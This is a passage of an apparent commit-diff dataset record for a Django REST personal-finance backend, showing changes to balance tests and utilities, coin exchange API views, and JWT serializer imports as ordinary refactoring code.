self.get_annual_balance_data()\n        AnnualBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n        )\n    \n    def authenticate_add_monthly_balance(self):\n        self.authenticate_user(self.credentials)\n        self.add_monthly_balance()\n    \n    def add_monthly_balance(self):\n        data = self.get_monthly_balance_data()\n        MonthlyBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n            month=data['month']\n        )\n    \n    \n    def test_annual_balance_pagination_scheme(self):\n        \"\"\"\n        Checks AnnualBalance pagination scheme is correct\n        \"\"\"\n        # Add new AnnualBalance\n        self.authenticate_add_annual_balance()\n        # Get AnnualBalance data\n        response = self.get(self.annual_balance_list)\n        scheme = dict(response.data)\n        scheme['results'] = []\n        results = dict(response.data)['results']\n            \n        for result in results:\n            result.pop('created')\n            scheme['results'] += [dict(result)]\n        expected_scheme = {\n            'count': 1, 'next': None, 'previous': None, \n            'results': [\n                {\n                    'gross_quantity': 1.1, \n                    'net_quantity': 2.2,\n                    'coin_type': 'EUR',\n                    'year': now().date().year\n                }\n            ]\n        }\n        self.assertEqual(scheme, expected_scheme)\n\n    def test_annual_balance_two_pages(self):\n        \"\"\"\n        Checks 2 pages of AnnualBalance data is correct\n        \"\"\"\n        # Add First AnnualBalance\n        self.authenticate_add_annual_balance()\n        for i in range(19):\n            self.add_annual_balance()\n        # Get First page AnnualBalance data\n        response = self.get(self.annual_balance_list)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 20)\n        # 10 AnnualBalance in the first page\n        self.assertEqual(len(data['results']), 10)\n        # Second page\n        response = self.get(data['next'])\n        self.assertEqual(data['count'], 20)\n        # 10 AnnualBalance in the first page\n        self.assertEqual(len(data['results']), 10)\n\n    def test_monthly_balance_pagination_scheme(self):\n        \"\"\"\n        Checks MonthlyBalance pagination scheme is correct\n        \"\"\"\n        # Add new MonthlyBalance\n        self.authenticate_add_monthly_balance()\n        # Get MonthlyBalance data\n        response = self.get(self.monthly_balance_list)\n        scheme = dict(response.data)\n        scheme['results'] = []\n        results = dict(response.data)['results']\n            \n        for result in results:\n            result.pop('created')\n            scheme['results'] += [dict(result)]\n        expected_scheme = {\n            'count': 1, 'next': None, 'previous': None, \n            'results': [\n                {\n                    'gross_quantity': 1.1, \n                    'net_quantity': 2.2,\n                    'coin_type': 'EUR',\n                    'year': now().date().year,\n                    'month': now().date().month\n                }\n            ]\n        }\n        self.assertEqual(scheme, expected_scheme)\n\n    def test_monthly_balance_two_pages(self):\n        \"\"\"\n        Checks 2 pages of MonthlyBalance data is correct\n        \"\"\"\n        # Add First MonthlyBalance\n        self.authenticate_add_monthly_balance()\n        for i in range(19):\n            self.add_monthly_balance()\n        # Get First page MonthlyBalance data\n        response = self.get(self.monthly_balance_list)\n        data = dict(response.data)\n        self.assertEqual(data['count'], 20)\n        # 10 MonthlyBalance in the first page\n        self.assertEqual(len(data['results']), 10)\n        # Second page\n        response = self.get(data['next'])\n        self.assertEqual(data['count'], 20)\n        # 10 MonthlyBalance in the first page\n        self.assertEqual(len(data['results']), 10)"},"\/backend\/djangorest\/balance\/tests\/test_permission.py":{"changes":[{"diff":"\n     def get_annual_balance_data(self, user):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': user,\n             'year': now().date().year\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_permission.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n     def get_monthly_balance_data(self, user):\n         return {\n             'gross_quantity': 1.1,\n-            'net_quantity': 2.2,\n+            'expected_quantity': 2.2,\n             'coin_type': self.coin_type,\n             'owner': user,\n             'year': now().date().year,\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_permission.py","badparts":["            'net_quantity': 2.2,"],"goodparts":["            'expected_quantity': 2.2,"]},{"diff":"\n         data = self.get_annual_balance_data(user)\n         return AnnualBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=data['year'],\n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_permission.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]},{"diff":"\n         data = self.get_monthly_balance_data(user)\n         return MonthlyBalance.objects.create(\n             gross_quantity=data['gross_quantity'],\n-            net_quantity=data['net_quantity'],\n+            expected_quantity=data['expected_quantity'],\n             coin_type=data['coin_type'],\n             owner=data['owner'],\n             year=dat","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_permission.py","badparts":["            net_quantity=data['net_quantity'],"],"goodparts":["            expected_quantity=data['expected_quantity'],"]}],"source":"\nfrom collections import OrderedDict from django.utils.timezone import now import json from rest_framework.test import APITestCase from rest_framework import status from django.urls import reverse from balance.models import AnnualBalance, CoinType, MonthlyBalance from custom_auth.models import InvitationCode, User import logging from expense.models import Expense, ExpenseType class DateBalancePermissionsTests(APITestCase): def setUp(self): logging.disable(logging.WARNING) self.jwt_obtain_url=reverse('jwt_obtain_pair') self.annual_balance_list=reverse('annual-balance-list') self.monthly_balance_list=reverse('monthly-balance-list') self.inv_code1=InvitationCode.objects.create() self.inv_code2=InvitationCode.objects.create() self.coin_type=CoinType.objects.create(code='EUR') self.user_data1={ 'username':\"username1\", 'email':\"email1@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code1.code) } self.user_data2={ 'username':\"username2\", 'email':\"email2@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code2.code) } self.credentials1={ 'email':\"email1@test.com\", \"password\": \"password1@212\" } self.credentials2={ 'email':\"email2@test.com\", \"password\": \"password1@212\" } self.user1=User.objects.create( username=self.user_data1[\"username\"], email=self.user_data1[\"email\"], inv_code=self.inv_code1, verified=True ) self.user1.set_password(self.user_data1['password']) self.user1.save() self.user2=User.objects.create( username=self.user_data2[\"username\"], email=self.user_data2[\"email\"], inv_code=self.inv_code2, verified=True ) self.user2.set_password(self.user_data2['password']) self.user2.save() return super().setUp() def get(self, url): return self.client.get(url) def post(self, url, data={}): return self.client.post( url, json.dumps(data), content_type=\"application\/json\" ) def authenticate_user(self, credentials): jwt=self.post(self.jwt_obtain_url, credentials).data['access'] self.client.credentials(HTTP_AUTHORIZATION='Bearer ' +str(jwt)) def get_annual_balance_data(self, user): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': user, 'year': now().date().year } def get_monthly_balance_data(self, user): return{ 'gross_quantity': 1.1, 'net_quantity': 2.2, 'coin_type': self.coin_type, 'owner': user, 'year': now().date().year, 'month': now().date().month } def add_annual_balance(self, user): data=self.get_annual_balance_data(user) return AnnualBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], ).id def add_monthly_balance(self, user): data=self.get_monthly_balance_data(user) return MonthlyBalance.objects.create( gross_quantity=data['gross_quantity'], net_quantity=data['net_quantity'], coin_type=data['coin_type'], owner=data['owner'], year=data['year'], month=data['month'] ).id def test_annual_balance_get_list_url(self): \"\"\" Checks permissions with AnnualBalance get and list \"\"\" self.authenticate_user(self.credentials1) id=self.add_annual_balance(self.user1) response=self.get(self.annual_balance_list) self.assertEqual(response.status_code, status.HTTP_200_OK) self.assertEqual(dict(response.data)['count'], 1) self.authenticate_user(self.credentials2) response=self.get(self.annual_balance_list) self.assertEqual(response.status_code, status.HTTP_200_OK) self.assertEqual(dict(response.data)['count'], 0) response=self.get(self.annual_balance_list+'\/'+str(id)) self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND) def test_monthly_balance_get_list_url(self): \"\"\" Checks permissions with MonthlyBalance get and list \"\"\" self.authenticate_user(self.credentials1) id=self.add_monthly_balance(self.user1) response=self.get(self.monthly_balance_list) self.assertEqual(response.status_code, status.HTTP_200_OK) self.assertEqual(dict(response.data)['count'], 1) self.authenticate_user(self.credentials2) response=self.get(self.monthly_balance_list) self.assertEqual(response.status_code, status.HTTP_200_OK) self.assertEqual(dict(response.data)['count'], 0) response=self.get(self.monthly_balance_list+'\/'+str(id)) self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND) ","sourceWithComments":"from collections import OrderedDict\nfrom django.utils.timezone import now\nimport json\nfrom rest_framework.test import APITestCase\nfrom rest_framework import status\nfrom django.urls import reverse\nfrom balance.models import AnnualBalance, CoinType, MonthlyBalance\nfrom custom_auth.models import InvitationCode, User\nimport logging\nfrom expense.models import Expense, ExpenseType\n\n\nclass DateBalancePermissionsTests(APITestCase):\n    def setUp(self):\n        # Avoid WARNING logs while testing wrong requests \n        logging.disable(logging.WARNING)\n\n        self.jwt_obtain_url=reverse('jwt_obtain_pair')\n        self.annual_balance_list=reverse('annual-balance-list')\n        self.monthly_balance_list=reverse('monthly-balance-list')\n        \n        # Create InvitationCodes\n        self.inv_code1 = InvitationCode.objects.create()\n        self.inv_code2 = InvitationCode.objects.create()\n        self.coin_type = CoinType.objects.create(code='EUR')\n        # Test user data\n        self.user_data1={\n            'username':\"username1\",\n            'email':\"email1@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code1.code)\n        }\n        self.user_data2={\n            'username':\"username2\",\n            'email':\"email2@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code2.code)\n        }\n        self.credentials1 = {\n            'email':\"email1@test.com\",\n            \"password\": \"password1@212\"\n        }\n        self.credentials2 = {\n            'email':\"email2@test.com\",\n            \"password\": \"password1@212\"\n        }\n        # User creation\n        self.user1 = User.objects.create(\n            username=self.user_data1[\"username\"],\n            email=self.user_data1[\"email\"],\n            inv_code=self.inv_code1,\n            verified=True\n        )\n        self.user1.set_password(self.user_data1['password'])\n        self.user1.save()\n        self.user2 = User.objects.create(\n            username=self.user_data2[\"username\"],\n            email=self.user_data2[\"email\"],\n            inv_code=self.inv_code2,\n            verified=True\n        )\n        self.user2.set_password(self.user_data2['password'])\n        self.user2.save()\n        return super().setUp()\n    \n    def get(self, url) :\n        return self.client.get(url)\n    \n    def post(self, url, data={}) :\n        return self.client.post(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def authenticate_user(self, credentials):\n        # Get jwt token\n        jwt=self.post(self.jwt_obtain_url, credentials).data['access']\n        self.client.credentials(HTTP_AUTHORIZATION='Bearer ' + str(jwt))\n    \n    def get_annual_balance_data(self, user):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': user,\n            'year': now().date().year\n        }\n    \n    def get_monthly_balance_data(self, user):\n        return {\n            'gross_quantity': 1.1,\n            'net_quantity': 2.2,\n            'coin_type': self.coin_type,\n            'owner': user,\n            'year': now().date().year,\n            'month': now().date().month\n        }\n    \n    def add_annual_balance(self, user):\n        data = self.get_annual_balance_data(user)\n        return AnnualBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n        ).id\n    \n    def add_monthly_balance(self, user):\n        data = self.get_monthly_balance_data(user)\n        return MonthlyBalance.objects.create(\n            gross_quantity=data['gross_quantity'],\n            net_quantity=data['net_quantity'],\n            coin_type=data['coin_type'],\n            owner=data['owner'],\n            year=data['year'],\n            month=data['month']\n        ).id\n\n\n    def test_annual_balance_get_list_url(self):\n        \"\"\"\n        Checks permissions with AnnualBalance get and list\n        \"\"\"\n        self.authenticate_user(self.credentials1)\n        # Add new AnnualBalance as user1\n        id = self.add_annual_balance(self.user1)\n        # Get AnnualBalance data as user1\n        response = self.get(self.annual_balance_list)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        self.assertEqual(dict(response.data)['count'], 1)\n        # Get AnnualBalance data as user2\n        self.authenticate_user(self.credentials2)\n        response = self.get(self.annual_balance_list)\n        # Gets an empty dict\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        self.assertEqual(dict(response.data)['count'], 0)\n        # Try with an specific expense\n        response = self.get(self.annual_balance_list+'\/'+str(id))\n        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)\n\n    def test_monthly_balance_get_list_url(self):\n        \"\"\"\n        Checks permissions with MonthlyBalance get and list\n        \"\"\"\n        self.authenticate_user(self.credentials1)\n        # Add new MonthlyBalance as user1\n        id = self.add_monthly_balance(self.user1)\n        # Get MonthlyBalance data as user1\n        response = self.get(self.monthly_balance_list)\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        self.assertEqual(dict(response.data)['count'], 1)\n        # Get MonthlyBalance data as user2\n        self.authenticate_user(self.credentials2)\n        response = self.get(self.monthly_balance_list)\n        # Gets an empty dict\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        self.assertEqual(dict(response.data)['count'], 0)\n        # Try with an specific expense\n        response = self.get(self.monthly_balance_list+'\/'+str(id))\n        self.assertEqual(response.status_code, status.HTTP_404_NOT_FOUND)"},"\/backend\/djangorest\/balance\/utils.py":{"changes":[{"diff":"\n     # Update extra fields\n     if (is_revenue): annual_balance.gross_quantity += converted_quantity\n     else: annual_balance.gross_quantity -= converted_quantity\n-    annual_balance.net_quantity = owner.expected_annual_balance \\\n-        - annual_balance.gross_quantity\n+    annual_balance.gross_quantity = round(annual_balance.gross_quantity, 2)\n+    annual_balance.expected_quantity = round(owner.expected_annual_balance, 2)\n     annual_balance.save()\n \n \n","add":2,"remove":2,"filename":"\/backend\/djangorest\/balance\/utils.py","badparts":["    annual_balance.net_quantity = owner.expected_annual_balance \\","        - annual_balance.gross_quantity"],"goodparts":["    annual_balance.gross_quantity = round(annual_balance.gross_quantity, 2)","    annual_balance.expected_quantity = round(owner.expected_annual_balance, 2)"]},{"diff":"\n     # Update extra fields\n     if (is_revenue): monthly_balance.gross_quantity += converted_quantity\n     else: monthly_balance.gross_quantity -= converted_quantity\n-    monthly_balance.net_quantity = owner.expected_monthly_balance \\\n-        - monthly_balance.gross_quantity\n+    monthly_balance.gross_quantity = round(monthly_balance.gross_quantity, 2)\n+    monthly_balance.expected_quantity = round(owner.expected_monthly_balance,2)\n     monthly_balance.save()\n\\ No newline at ","add":2,"remove":2,"filename":"\/backend\/djangorest\/balance\/utils.py","badparts":["    monthly_balance.net_quantity = owner.expected_monthly_balance \\","        - monthly_balance.gross_quantity"],"goodparts":["    monthly_balance.gross_quantity = round(monthly_balance.gross_quantity, 2)","    monthly_balance.expected_quantity = round(owner.expected_monthly_balance,2)"]}],"source":"\nfrom balance.models import AnnualBalance, MonthlyBalance from coin.currency_converter_integration import convert_or_fetch from revenue.models import Revenue def check_dates_and_update_date_balances( instance, converted_quantity, converted_new_quantity=None, new_date=None ): is_revenue=type(instance)==Revenue month=instance.date.month year=instance.date.year owner=instance.owner if new_date: if year !=new_date.year or month !=new_date.month: update_or_create_annual_balance( -converted_quantity, owner, year, is_revenue ) update_or_create_monthly_balance( -converted_quantity, owner, year, month, is_revenue ) update_or_create_annual_balance( converted_new_quantity if converted_new_quantity \\ else converted_quantity, owner, new_date.year, is_revenue ) update_or_create_monthly_balance( converted_new_quantity if converted_new_quantity \\ else converted_quantity, owner, new_date.year, new_date.month, is_revenue ) return else: if not converted_new_quantity: return update_or_create_annual_balance( converted_new_quantity -converted_quantity, owner, year, is_revenue ) update_or_create_monthly_balance( converted_new_quantity -converted_quantity, owner, year, month, is_revenue ) def update_or_create_annual_balance(converted_quantity, owner, year, is_revenue): \"\"\" Create or update an annual_balance from an expense or revenue, if it is revenue the quantity is increased, otherwise(revenue) it is decreased \"\"\" annual_balance, created=AnnualBalance.objects.get_or_create( owner=owner, year=year ) annual_balance.coin_type=owner.pref_coin_type if not created: annual_balance.gross_quantity=convert_or_fetch( annual_balance.coin_type, owner.pref_coin_type, annual_balance.gross_quantity ) if(is_revenue): annual_balance.gross_quantity +=converted_quantity else: annual_balance.gross_quantity -=converted_quantity annual_balance.net_quantity=owner.expected_annual_balance \\ -annual_balance.gross_quantity annual_balance.save() def update_or_create_monthly_balance(converted_quantity, owner, year, month, is_revenue): \"\"\" Create or update a monthly_balance from an expense or revenue, if it is revenue the quantity is increased, otherwise(revenue) it is decreased \"\"\" monthly_balance, created=MonthlyBalance.objects.get_or_create( owner=owner, year=year, month=month ) monthly_balance.coin_type=owner.pref_coin_type if not created: monthly_balance.gross_quantity=convert_or_fetch( monthly_balance.coin_type, owner.pref_coin_type, monthly_balance.gross_quantity ) if(is_revenue): monthly_balance.gross_quantity +=converted_quantity else: monthly_balance.gross_quantity -=converted_quantity monthly_balance.net_quantity=owner.expected_monthly_balance \\ -monthly_balance.gross_quantity monthly_balance.save() ","sourceWithComments":"from balance.models import AnnualBalance, MonthlyBalance\nfrom coin.currency_converter_integration import convert_or_fetch\nfrom revenue.models import Revenue\n\n\ndef check_dates_and_update_date_balances(\n        instance,\n        converted_quantity,\n        converted_new_quantity=None,\n        new_date=None\n    ):\n    is_revenue = type(instance) == Revenue\n    month = instance.date.month\n    year = instance.date.year\n    owner = instance.owner\n    if new_date:\n        if year != new_date.year or month != new_date.month:\n            # Remove quantity for old date_balances\n            update_or_create_annual_balance(\n                - converted_quantity, owner, year, is_revenue\n            )\n            update_or_create_monthly_balance(\n                - converted_quantity, owner, year, month,\n                is_revenue\n            )\n            # Add quantity for new date_balances\n            update_or_create_annual_balance(\n                converted_new_quantity if converted_new_quantity \\\n                else converted_quantity,\n                owner, new_date.year, is_revenue\n            )\n            update_or_create_monthly_balance(\n                converted_new_quantity if converted_new_quantity \\\n                else converted_quantity, owner, \n                new_date.year, new_date.month,\n                is_revenue\n            )\n            return\n        else:\n            # In case date does not change and there is no new quantity\n            if not converted_new_quantity: return\n    # In case there is no new date (month and year), \n    # only quantity should be calculated\n    update_or_create_annual_balance(\n        converted_new_quantity - converted_quantity,\n        owner, year, is_revenue\n    )\n    update_or_create_monthly_balance(\n        converted_new_quantity - converted_quantity,\n        owner, year, month, is_revenue\n    )\n\ndef update_or_create_annual_balance(converted_quantity, owner, \n    year, is_revenue):\n    \"\"\"\n    Create or update an annual_balance from an expense or revenue, \n    if it is revenue the quantity is increased, otherwise (revenue) \n    it is decreased\n    \"\"\"\n    annual_balance, created = AnnualBalance.objects.get_or_create(\n        owner = owner,\n        year = year\n    )\n    annual_balance.coin_type = owner.pref_coin_type\n    # If an annual_balance already existed, its gross_quantity \n    # must be converted\n    if not created:\n        annual_balance.gross_quantity = convert_or_fetch(\n            annual_balance.coin_type, \n            owner.pref_coin_type,\n            annual_balance.gross_quantity\n        )\n    # Update extra fields\n    if (is_revenue): annual_balance.gross_quantity += converted_quantity\n    else: annual_balance.gross_quantity -= converted_quantity\n    annual_balance.net_quantity = owner.expected_annual_balance \\\n        - annual_balance.gross_quantity\n    annual_balance.save()\n\n\ndef update_or_create_monthly_balance(converted_quantity, owner, \n    year, month, is_revenue):\n    \"\"\"\n    Create or update a monthly_balance from an expense or revenue, \n    if it is revenue the quantity is increased, otherwise (revenue) \n    it is decreased\n    \"\"\"\n    monthly_balance, created = MonthlyBalance.objects.get_or_create(\n        owner = owner,\n        year = year,\n        month = month\n    )\n    monthly_balance.coin_type = owner.pref_coin_type\n    # If a monthly_balance already existed, its gross_quantity \n    # must be converted\n    if not created:\n        monthly_balance.gross_quantity = convert_or_fetch(\n            monthly_balance.coin_type, \n            owner.pref_coin_type,\n            monthly_balance.gross_quantity\n        )\n    # Update extra fields\n    if (is_revenue): monthly_balance.gross_quantity += converted_quantity\n    else: monthly_balance.gross_quantity -= converted_quantity\n    monthly_balance.net_quantity = owner.expected_monthly_balance \\\n        - monthly_balance.gross_quantity\n    monthly_balance.save()"},"\/backend\/djangorest\/coin\/api\/views.py":{"changes":[{"diff":"\n                     status=status.HTTP_400_BAD_REQUEST\n                 )\n             return Response(\n-                data={\"coin_exchange\": json_data[code]},\n+                data={\n+                    \"code\": code,\n+                    \"exchanges\": [\n+                        { \n+                            \"code\": exchange,\n+                            \"value\": json_data[code][exchange]\n+                        } for exchange in json_data[code].keys()\n+                    ]\n+                },\n             )\n         return Response(\n             data={\"detail\": _(\"No exchange data, try later\")},\n","add":9,"remove":1,"filename":"\/backend\/djangorest\/coin\/api\/views.py","badparts":["                data={\"coin_exchange\": json_data[code]},"],"goodparts":["                data={","                    \"code\": code,","                    \"exchanges\": [","                        { ","                            \"code\": exchange,","                            \"value\": json_data[code][exchange]","                        } for exchange in json_data[code].keys()","                    ]","                },"]},{"diff":"\n     permission_classes = (IsAuthenticated,)\n     \n     def get(self, request, days, format=None):\n-        if days < 1: return Response(data={})\n+        if days < 1: return Response(data=[])\n         if days > 30: days = 30\n         data = CoinExchange.objects.filter(\n             created__lte=timezone.now(), \n             created__gt=timezone.now() - timezone.timedelta(days=days)\n         )\n         return Response(\n-            data=[\n-                {\n-                    'echange': json.loads(x.exchange_data), \n-                    'date': x.created.date()\n-                } for x in data\n-            ]\n+            data={\n+                \"date_exchanges\": [\n+                    {\n+                        'exchanges': [\n+                            {\n+                                \"code\": code,\n+                                \"exchanges\": [\n+                                    { \n+                                        \"code\": exchange,\n+                                        \"value\": json.loads(x.exchange_data)[code][exchange]\n+                                    } for exchange in json.loads(x.exchange_data)[code].keys()\n+                                ]\n+                            } for code in json.loads(x.exchange_data).keys()\n+                        ], \n+                        'date': x.created.date()\n+                    } for x in data\n+                ]\n+            }\n         )\n\\ No newline at","add":19,"remove":7,"filename":"\/backend\/djangorest\/coin\/api\/views.py","badparts":["        if days < 1: return Response(data={})","            data=[","                {","                    'echange': json.loads(x.exchange_data), ","                    'date': x.created.date()","                } for x in data","            ]"],"goodparts":["        if days < 1: return Response(data=[])","            data={","                \"date_exchanges\": [","                    {","                        'exchanges': [","                            {","                                \"code\": code,","                                \"exchanges\": [","                                    { ","                                        \"code\": exchange,","                                        \"value\": json.loads(x.exchange_data)[code][exchange]","                                    } for exchange in json.loads(x.exchange_data)[code].keys()","                                ]","                            } for code in json.loads(x.exchange_data).keys()","                        ], ","                        'date': x.created.date()","                    } for x in data","                ]","            }"]}],"source":"\nimport json from coin.models import CoinExchange, CoinType from coin.api.serializers import CoinTypeSerializer from rest_framework.permissions import IsAuthenticated from rest_framework import generics, status from rest_framework.response import Response from rest_framework.views import APIView from django.utils.translation import gettext_lazy as _ from django.utils import timezone from django.utils.decorators import method_decorator from django.views.decorators.cache import cache_page from django.views.decorators.vary import vary_on_headers from rest_framework.permissions import AllowAny class CoinTypeRetrieveView(generics.RetrieveAPIView): queryset=CoinType.objects.all() permission_classes=(IsAuthenticated,) serializer_class=CoinTypeSerializer @method_decorator(cache_page(12 * 60 * 60)) @method_decorator(vary_on_headers(\"Authorization\")) def get(self, request, *args, **kwargs): \"\"\" This view will be cached for 12 hours \"\"\" return super(CoinTypeRetrieveView, self).get(request, *args, **kwargs) class CoinTypeListView(generics.ListAPIView): queryset=CoinType.objects.all() permission_classes=(AllowAny,) serializer_class=CoinTypeSerializer @method_decorator(cache_page(12 * 60 * 60)) @method_decorator(vary_on_headers(\"Authorization\")) def get(self, request, *args, **kwargs): \"\"\" This view will be cached for 12 hours \"\"\" return super(CoinTypeListView, self).get(request, *args, **kwargs) class CoinExchangeRetrieveView(APIView): permission_classes=(IsAuthenticated,) def get(self, request, code, format=None): last_coin_exchange=CoinExchange.objects.last() if last_coin_exchange: exchange_data=last_coin_exchange.exchange_data json_data=json.loads(exchange_data) if code not in json_data: return Response( data={\"detail\": _(\"{} code not supported\").format(code)}, status=status.HTTP_400_BAD_REQUEST ) return Response( data={\"coin_exchange\": json_data[code]}, ) return Response( data={\"detail\": _(\"No exchange data, try later\")}, status=status.HTTP_400_BAD_REQUEST ) class CoinExchangeListView(APIView): permission_classes=(IsAuthenticated,) def get(self, request, days, format=None): if days < 1: return Response(data={}) if days > 30: days=30 data=CoinExchange.objects.filter( created__lte=timezone.now(), created__gt=timezone.now() -timezone.timedelta(days=days) ) return Response( data=[ { 'echange': json.loads(x.exchange_data), 'date': x.created.date() } for x in data ] ) ","sourceWithComments":"import json\nfrom coin.models import CoinExchange, CoinType\nfrom coin.api.serializers import CoinTypeSerializer\nfrom rest_framework.permissions import IsAuthenticated\nfrom rest_framework import generics, status\nfrom rest_framework.response import Response\nfrom rest_framework.views import APIView\nfrom django.utils.translation import gettext_lazy as _\nfrom django.utils import timezone\nfrom django.utils.decorators import method_decorator\nfrom django.views.decorators.cache import cache_page\nfrom django.views.decorators.vary import vary_on_headers\nfrom rest_framework.permissions import AllowAny\n\n\nclass CoinTypeRetrieveView(generics.RetrieveAPIView):\n    queryset = CoinType.objects.all()\n    permission_classes = (IsAuthenticated,)\n    serializer_class = CoinTypeSerializer\n\n    @method_decorator(cache_page(12 * 60 * 60))\n    @method_decorator(vary_on_headers(\"Authorization\"))\n    def get(self, request, *args, **kwargs):\n        \"\"\"\n        This view will be cached for 12 hours\n        \"\"\"\n        return super(CoinTypeRetrieveView, self).get(request, *args, **kwargs)\n\nclass CoinTypeListView(generics.ListAPIView):\n    queryset = CoinType.objects.all()\n    permission_classes = (AllowAny,)\n    serializer_class = CoinTypeSerializer\n    \n    @method_decorator(cache_page(12 * 60 * 60))\n    @method_decorator(vary_on_headers(\"Authorization\"))\n    def get(self, request, *args, **kwargs):\n        \"\"\"\n        This view will be cached for 12 hours\n        \"\"\"\n        return super(CoinTypeListView, self).get(request, *args, **kwargs)\n\n\nclass CoinExchangeRetrieveView(APIView):\n    permission_classes = (IsAuthenticated,)\n    \n    def get(self, request, code, format=None):\n        last_coin_exchange = CoinExchange.objects.last()\n        if last_coin_exchange:\n            exchange_data = last_coin_exchange.exchange_data\n            json_data = json.loads(exchange_data)\n            if code not in json_data:\n                return Response(\n                    data={\"detail\": _(\"{} code not supported\").format(code)},\n                    status=status.HTTP_400_BAD_REQUEST\n                )\n            return Response(\n                data={\"coin_exchange\": json_data[code]},\n            )\n        return Response(\n            data={\"detail\": _(\"No exchange data, try later\")},\n            status=status.HTTP_400_BAD_REQUEST\n        )\n\nclass CoinExchangeListView(APIView):\n    permission_classes = (IsAuthenticated,)\n    \n    def get(self, request, days, format=None):\n        if days < 1: return Response(data={})\n        if days > 30: days = 30\n        data = CoinExchange.objects.filter(\n            created__lte=timezone.now(), \n            created__gt=timezone.now() - timezone.timedelta(days=days)\n        )\n        return Response(\n            data=[\n                {\n                    'echange': json.loads(x.exchange_data), \n                    'date': x.created.date()\n                } for x in data\n            ]\n        )"},"\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_code_serializers.py":{"changes":[{"diff":"\n-import os\n from rest_framework import serializers\n-from rest_framework_simplejwt.serializers import TokenObtainPairSerializer\n-from custom_auth.models import User\n-from custom_auth.api.serializers.utils import check_user_with_email\n-from custom_auth.tasks import send_email_code\n+from django.utils.translation import get_language\n from django.utils.timezone import now\n from django.conf import settings\n+from custom_auth.api.serializers.utils import check_user_with_email\n+from custom_auth.models import User\n+from django.contrib.auth.password_validation import validate_password\n from django.utils.translation import gettext_lazy as _\n-from django.utils.translation import get_language\n-from rest_framework_simplejwt.serializers import TokenRefreshSerializer\n-from rest_framework_simplejwt.state import token_backend\n-from django.contrib.auth import get_user_model\n-\n-\n-class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):\n-\n-    @classmethod\n-    def get_token(cls, user):\n-        if not user.inv_code:\n-            raise serializers.ValidationError(\n-                {\"inv_code\": _(\"No invitation code stored\")})\n-        if not user.verified:\n-            raise serializers.ValidationError(\n-                {\"verified\": _(\"Unverified email\")})\n-        token = super(CustomTokenObtainPairSerializer, cls).get_token(user)\n-        # Custom keys added in PAYLOAD\n-        token['username'] = user.username\n-        token['email'] = user.email\n-        return token\n-\n-class CustomTokenRefreshSerializer(TokenRefreshSerializer):\n-    \"\"\"\n-    Inherit from `TokenRefreshSerializer` and touch the database\n-    before re-issuing a new access token and ensure that the user\n-    exists and is active.\n-    \"\"\"\n-\n-    error_msg = _('No active account found with the given credentials')\n-\n-    def validate(self, attrs):\n-        try:\n-            token_payload = token_backend.decode(attrs['refresh'])\n-        except:\n-            raise serializers.ValidationError(\n-                {\"inavlid_token\": _('Invalid refresh token')})\n-        try:\n-            user = get_user_model().objects.get(pk=token_payload['user_id'])\n-        except get_user_model().DoesNotExist:\n-            raise serializers.ValidationError(\n-                {\"no_active_account\": self.error_msg})\n-        if not user.is_active:\n-            raise serializers.ValidationError(\n-                {\"no_active_account\": self.error_msg})\n-        return super().validate(attrs)\n+from custom_auth.tasks import send_email_code\n+import os\n \n \n class CodeSerializer(serializers.Serializer):\n","add":6,"remove":51,"filename":"\/backend\/djangorest\/custom_auth\/api\/serializers\/jwt_code_serializers.py","badparts":["from rest_framework_simplejwt.serializers import TokenObtainPairSerializer","from custom_auth.models import User","from custom_auth.api.serializers.utils import check_user_with_email","from custom_auth.tasks import send_email_code","from django.utils.translation import get_language","from rest_framework_simplejwt.serializers import TokenRefreshSerializer","from rest_framework_simplejwt.state import token_backend","from django.contrib.auth import get_user_model","class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):","    @classmethod","    def get_token(cls, user):","        if not user.inv_code:","            raise serializers.ValidationError(","                {\"inv_code\": _(\"No invitation code stored\")})","        if not user.verified:","            raise serializers.ValidationError(","                {\"verified\": _(\"Unverified 